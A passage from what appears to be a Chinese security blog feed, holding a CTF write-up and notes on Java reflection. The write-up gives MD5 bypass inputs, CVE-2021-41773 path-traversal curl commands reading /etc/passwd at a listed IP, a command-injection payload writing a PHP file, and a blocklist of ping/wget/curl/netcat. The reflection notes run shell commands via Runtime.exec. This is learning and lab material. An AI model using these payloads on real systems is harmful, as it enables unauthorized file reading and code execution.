&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="step1"><a href="#step1" class="headerlink" title="step1:"></a>step1:</h5><p>这一步考察的是php md5弱类型比较,使用两个md5后相同前缀的字符串通过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"> </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br></pre></td></tr></table></figure>

<h5 id="step2"><a href="#step2" class="headerlink" title="step2:"></a>step2:</h5><p>这步必须要求md5后前六位为dcd385,写个python脚本试试?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">value</span>):</span></span><br><span class="line">    f = hashlib.md5()   </span><br><span class="line">    f.update(value.encode(<span class="string">&quot;utf-8&quot;</span>))   </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(f.hexdigest())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000000000</span>):</span><br><span class="line">    a=<span class="built_in">str</span>(i)</span><br><span class="line">    res=md5(a)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">0</span>:<span class="number">6</span>]==<span class="string">&quot;dcd385&quot;</span>):</span><br><span class="line">         <span class="built_in">print</span>(a)</span><br><span class="line">         <span class="built_in">print</span>(res)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>23027101<br>dcd385acfd7e39b127fee73a03b4b406<br>23902125<br>dcd385454281e15747b423c945acd5a1</p>
<h5 id="step3"><a href="#step3" class="headerlink" title="step3:"></a>step3:</h5><p>起初懵逼了,===不好搞,各种百度,最后查到了方法</p>
<p>利用url编码的细微不同,但是解码后的字符串相同,这个只能在get方式中使用,get会自动解码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$s1</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s2</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s3</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=fwwy&amp;val1=s878926199a&amp;val2=s155964671a&amp;val3=23027101&amp;val4=23902125&amp;a=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&amp;b=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab</span><br></pre></td></tr></table></figure>





<h4 id="CVE-2021-41773-http-120-76-136-64-1234"><a href="#CVE-2021-41773-http-120-76-136-64-1234" class="headerlink" title="CVE-2021-41773 http://120.76.136.64:1234/"></a>CVE-2021-41773 <a href="http://120.76.136.64:1234/">http://120.76.136.64:1234/</a></h4><p>第一次做这种类型的题目,真实存在的漏洞,在网上参照别人的exp做的,对于原理还不甚了解</p>
<p>验证漏洞是否存在</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v --path-as-is http://120.76.136.64:1234/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220120170050055.png" alt="image-20220120170050055"></p>
<p>payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v --path-as-is http://http://120.76.136.64:1234/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220120165653708.png" alt="image-20220120165653708"></p>
<p>flag{This is CVE-2021-41773}</p>
<h5 id="命令执行-http-139-224-40-131-2022-1-test-php"><a href="#命令执行-http-139-224-40-131-2022-1-test-php" class="headerlink" title="命令执行 http://139.224.40.131/2022/1/test.php"></a>命令执行 <a href="http://139.224.40.131/2022/1/test.php">http://139.224.40.131/2022/1/test.php</a></h5><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//f1111aaaaag.php</span></span><br><span class="line"><span class="comment">//如果需要写文件的话，在本目录下有个tmp目录，可以向里面写文件。不过10分钟后，文件将被删除</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;f1111aaaaag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$H</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;HeNu&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/ping|wget|exec|curl|passthru|netcat|[|]/i&#x27;</span>, <span class="variable">$H</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$H</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;think again...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;F&#x27;</span>];</span><br><span class="line"><span class="comment">//$f是输入你得到的flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span>===<span class="variable">$f</span>)&#123;</span><br><span class="line">  <span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;N&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;姓名全拼...写出来的把思路跟我分享一下呗，让我学习学习...&quot;</span>);</span><br><span class="line">  file_put_contents(<span class="string">&#x27;./success.txt&#x27;</span>,<span class="variable">$name</span>.PHP_EOL,FILE_APPEND);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">&#125;  ???</span><br></pre></td></tr></table></figure>

<p>本题,substr只执行前六个</p>
<p>substr不改变被操作的字符串</p>
<p>ping和wget,curl等都被ban掉了,不能通过请求外带数据获取flag了(在我的认知中是酱紫)</p>
<p>反引号包裹其实就等于shell_exec,不会主动输出,需要加echo</p>
<p>linux中命令分隔符<code>;</code>不管前面的命令成功与否,都会接着执行下去</p>
<p>6个字符,参考了网络上类似题目的wp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`$H;`空格</span><br><span class="line">空格可以换成+</span><br></pre></td></tr></table></figure>

<p>刚好是六个字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设构造这样的字符串</span><br><span class="line">`$H`;空格touch ./tmp/flag.php</span><br><span class="line">substr后eval的内容就是eval(`$H`;)===eval(shell_exec($H);)===shell_exec(&quot;`$H`;空格touch ./tmp/flag.php&quot;),而前面的`$H`;是一个无效命令,接着就会执行后面的命令</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">最后payload</span><br><span class="line">HeNu=`$H`; touch ./tmp/test1.php;echo &#x27;&lt;?php highlight_file(__FILE__);include(&quot;../f1111aaaaag.php&quot;);echo $flag;&#x27; &gt; ./tmp/test1.php</span><br></pre></td></tr></table></figure>

<p>本来还想看下完成的名单和大家写的思路的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HeNu=`$H`; touch ./tmp/test2.php;cat ./success.txt 2&gt; ./tmp/test2.php;echo &#x27;&lt;?php</span><br><span class="line"> highlight_file(__FILE__);&#x27; &gt;&gt; ./tmp/test2.php</span><br></pre></td></tr></table></figure>

<p>没权限,失败了呜呜</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220120155948013.png" alt="image-20220120155948013"></p>
<h4 id="重定向符的总结"><a href="#重定向符的总结" class="headerlink" title="重定向符的总结"></a>重定向符的总结</h4><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220120160126028.png" alt="image-20220120160126028"></p>
<p><code>2&gt;&amp;1</code>把标准错误输出重定向到标准输出</p>
<p><code>0&gt;&amp;1</code>把标准输入重定向到标准输出</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>henu</tag>
      </tags>
  </entry>
  <entry>
    <title>java安全-反射-学习</title>
    <url>/2022/03/01/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="java安全-反射学习"><a href="#java安全-反射学习" class="headerlink" title="java安全,反射学习"></a>java安全,反射学习</h2><p>加入了p神的知识星球之后,通过p神发的java安全漫谈学习Java安全,p神讲解很好,恶补了java反射有关知识后,将知识点和代码自己边写边理解一遍</p>
<hr>
<p>java中反射赋予了java动态的特性</p>
<p>Class.forName()可以通过类的路径获取到一个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(className)  <span class="comment">//这个可以理解为下一个的封装</span></span><br><span class="line"><span class="comment">//等于</span></span><br><span class="line">Class.forName(className,<span class="keyword">true</span>,currentLoader)</span><br><span class="line">    <span class="comment">//第一个参数是类名,第二个参数表示是否初始化,第三个参数是ClassLoader</span></span><br></pre></td></tr></table></figure>

<p>Java默认的 ClassLoader 就是根据类名来加载类， 这个类名是类完整路径，如 java.lang.Runtime </p>
<h4 id="类中”初始化方法”的调用顺序与区别"><a href="#类中”初始化方法”的调用顺序与区别" class="headerlink" title="类中”初始化方法”的调用顺序与区别"></a>类中”初始化方法”的调用顺序与区别</h4><ul>
<li><p><code>static&#123;&#125;</code>静态代码块在”类初始化”的时候调用</p>
</li>
<li><p><code>&#123;&#125;</code>代码块的内容会在父类构造函数<code>super()</code>之后调用</p>
</li>
<li><p>最后调用构造函数</p>
</li>
</ul>
<p>还记得学java的时候说super必须写在构造函数的第一行</p>
<hr>
<p>**Person p = new Person(“zhangsan”,20); 该句话都做了什么事情？ **</p>
<p>1，因为new用到了Person.class.所以会先找到Person.class文件并加载到内存中。 </p>
<p>2，执行该类中的static代码块，如果有的话，给Person.class类进行初始化。</p>
<p>3，在堆内存中开辟空间，分配内存地址。 </p>
<p>4，在堆内存中建立对象的特有属性。并进行默认初始化。 </p>
<p>5，对属性进行显示初始化。 </p>
<p>6，对对象进行构造代码块初始化。 </p>
<p>7，对对象进行对应的构造函数初始化。 </p>
<p>8，将内存地址付给栈内存中的p变量。</p>
<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainPrint</span> </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;类内代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrainPrint</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在获取类对象的时候静态代码块就会执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//需要抛出一个类找不到的异常</span></span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.reflect.test.TrainPrint&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220301221808194.png" alt="image-20220301221808194"></p>
<p><strong>注:如果在forName获取Class对象的时候将是否初始化关闭(也就是 第二个参数 为 <code>false</code>),则不会执行静态代码块</strong></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220307130344019.png" alt="image-20220307130344019"></p>
<p>剩下两个”初始化方法”必须在实例化的时候才会调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//需要抛出一个类找不到的异常</span></span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.reflect.test.TrainPrint&quot;</span>);</span><br><span class="line">            Object o = aClass.newInstance();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>运行后的顺序</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220301222222222.png" alt="image-20220301222222222"></p>
<h4 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h4><p>综上所述,其中静态代码块可以写入恶意代码从而在”类初始化”的时候调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exeCommand</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            runtime.exec(<span class="string">&quot;cmd /C calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过加载该类就可以执行<code>static&#123;&#125;</code>中的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exe</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.reflect.test.exeCommand&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="调用类中的方法执行恶意代码"><a href="#调用类中的方法执行恶意代码" class="headerlink" title="调用类中的方法执行恶意代码"></a>调用类中的方法执行恶意代码</h3><p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不 需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</p>
<p>ava的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： C1.class 和 C1$C2.class ，我们可以把他们看作两个无关的类，通过 Class.forName(“C1$C2”) 即可加载这个内 部类。 </p>
<p>获得类以后，我们可以继续使用反射来获取这个类中的属性、方法，也可以实例化这个类，并调用方 法。</p>
<p><code>class.newInstance()</code> 的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候 在写漏洞利用方法的时候，会发现使用 <code>newInstance</code> 总是不成功，这时候原因可能是：</p>
<ul>
<li>类没有无参构造函数</li>
<li>类的构造函数是私有的</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runtime</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            aClass.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(aClass.newInstance(),<span class="string">&quot;cmd /C whoami&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>会报一个这样的错</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220302002903587.png" alt="image-20220302002903587"></p>
<p>为什么会将构造方法设置为private呢</p>
<p>很常见的一个设计模式就是”单例模式”</p>
<p>比如对于web应用来说,数据库只需要建立一次连接,而不是每次用到数据库的时候再建立一个连接,此时就可以将数据库连接使用的类的构造方法设置为私有,再通过一个static方法来获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">connection</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> connection instance=<span class="keyword">new</span> connection();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> connection <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">connection</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;数据库连接建立&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样只有类初始化的时候会执行一个构造函数,后面只能通过<code>getInstance</code>获取这个对象,避免建立多个数据库连接</p>
<p>Runtime类就是”单例模式”,只能通过<code>Runtime.getRuntime()</code>来获取到<code>Runtime</code>对象</p>
<p>对代码做出修改之后成功执行命令</p>
<p>其中<code>aClass.getMethod(&quot;getRuntime&quot;).invoke(aClass)</code>,用来获取Runtime对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">            aClass.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(aClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(aClass),<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

